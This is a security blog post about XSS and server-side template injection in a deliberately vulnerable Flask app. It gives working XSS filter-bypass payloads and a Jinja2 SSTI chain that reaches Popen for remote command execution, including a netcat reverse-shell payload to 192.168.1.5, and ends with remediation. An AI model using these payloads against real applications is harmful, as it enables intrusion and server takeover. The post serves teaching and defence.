.. title: XSS and SSTI in Flask
.. slug: xss-ssti-in-flask
.. date: 2022-02-15 21:40:41 UTC-05:00
.. tags:
.. category: hacking
.. link:
.. description:
.. type: text

Introduction
=============

According to the project's home page,

  Flask is a lightweight WSGI web application framework. It is designed to make getting started quick and easy, with the ability to scale up to complex applications. It began as a simple wrapper around Werkzeug and Jinja and has become one of the most popular Python web application frameworks.

Django sits at the other end of the python web service spectrum.
Each has their own advantages and disadvantages.
If I had to pick a downside for Flask, it is that can be easy to introduce unintentional vulnerabilities.
This is **not** a problem with Flask itself, but is a result of improper sanitizing of user input.

This blog post will explore two vulnerabilities in an intentionally vulnerable flask app.

.. TEASER_END

I recently saw this code posted on twitter as a "spot the vulnerability" challenge.
I wanted to explore and do a more in depth explanation.

XSS
===

For example, take the following code:

.. gist:: 4c111b9adce0c603e76bc0f43f628216

At first glance, this seems relatively ok.
The first thing I usually look for is whether the filter function replaces all instances of the bad strings.
This function does correctly replace strings recursively, so that's good.
Unfortunately, the script does fail to recognize capitalized tags, such as ``Script``.
There is one problem, and that is the inability to add the closing bracket ``>``.
That means the standard ``<script>alert(1)</script>`` is not going to work.
Fortunately, this can be bypassed by using a different ntml entity.

::
  <img src=1 onerror=print()<!--
  <img src=1 onerror=al\u0065rt(1)<!--

Both of these work in Firefox.
So, what's happening here?
The first example, ``print`` is not one of the disallowed functions.
This should open the print page dialog and is used to validate that the onerror function is fired.
The second example is a unicode escape for the standard alert function.
I believe this works because the ``\u0035`` is not converted to ``e`` until later on in the request lifecycle.

SSTI
====

Now that XSS is out of the way, the really critical part of this code is that there is no Server Side Template Injection (SSTI) protection.
Below is the full code for the app, which is run using ``python vulnerable-flask-app.py``

.. gist:: 857af16801958f370492a6f4caeaaa83

Flask is not the only web application framework that can have SSTI vulnerabilities.
Things like node.js can have SSTI bugs.

On the back end, flask is rendering HTML using the Jinja2 template engine.
The template engine syntax is very simple, and relies on curly braces (much like python fstrings).
An example is shown here: `jinja documentation <https://jinja2docs.readthedocs.io/en/stable/>`_

If an attacker can controls input the template that is rendered by the template engine, they may be able to execute code.
First, test with a simple string ``{{7*7}}`` in the input field.
If the result that is shown is 49, then there is a chance that RCE is possible.
Technically, the fact that it computes that mathematical expression, means that remote code has been executed.
However, just being able to multiply two numbers is not particularly helpful.

.. image:: /images/xss_ssti/49.png


Now I need to see if I can get into other python modules by exploring the Method Resolution Order.
First, start with an empty string ``{{''.__class__.__base__}}``
This displays the familiar python class object syntax, ``<class 'str'>``
Now, explore the base class ``{{''.__class__.__base__}}``, which shows ``<class 'object'>``
This gets to the top level python class 'object', so now go back down the tree.

``name={{''.__class__.__base__.__subclasses__()}}`` produces the following:

.. image:: /images/xss_ssti/subclasses.png

At this stage, the best thing to do is to copy that output into a text editor, and conver the instances of ``, <class`` to a newline.
What is needed, is the array index of the module that is helpful to run meaningful code, such as the ``os.Popen`` function to spawn a process.
Popen is on line 231, and is the list index 230 (python is 0 indexed).

Therefore, pointing the browser to
``localhost:8080?name={{''.__class__.__base__.__subclasses__()[231]('whoami', shell=True, stdout=-1).communicate()}}``
will show the output of the whoami command in the browser.
A reverse shell can be obtained by using the following parameter:
``{{''.__class__.__base__.__subclasses__()[231]('nc 192.168.1.5 1337', shell=True, stdout=-1).communicate()}}``

Most of that is pretty self explanatory, but there are a few things I wasn't familiar with before researching this.
``shell=True`` is an argument to Popen() that tells it to execute in a shell.
I admit I don't fully understand what ``stdout=-1`` does, but otherwise the output will go to STDOUT on the server.
Finally, ``communicate()`` gets the output from the shell that was spawned to run the command.

To state the obvious, is very bad.

Root cause analysis
===================

The root cause of this vulnerability exists in the lines 28-43 of the gist posted above.
By default, Flask automatically configures jinja2 to escape html strings unless the developer explicitly configures it otherwise.
In this example, the string format utility is used rather than allowing jinja2 to do its magic.

Remediation
===========

The remediation for both of these is extremely simple.
User input shouldn't be trusted anywhere, so it really shouldn't matter if a user inputs html entities or sql statements, or anything else.
However, if they really do need to be filtered out, the input text should be converted to lowercase for blacklist matching.
Ultimately, simply using the template engine correctly is the best and easiest method.

My proposed solution is located here:

.. gist:: cd649f0dcd0a63c8defe8c13d0cdac32

Lastly, all the code is available on `Github <https://github.com/haicenhacks/vulnerable-flask-app>`_
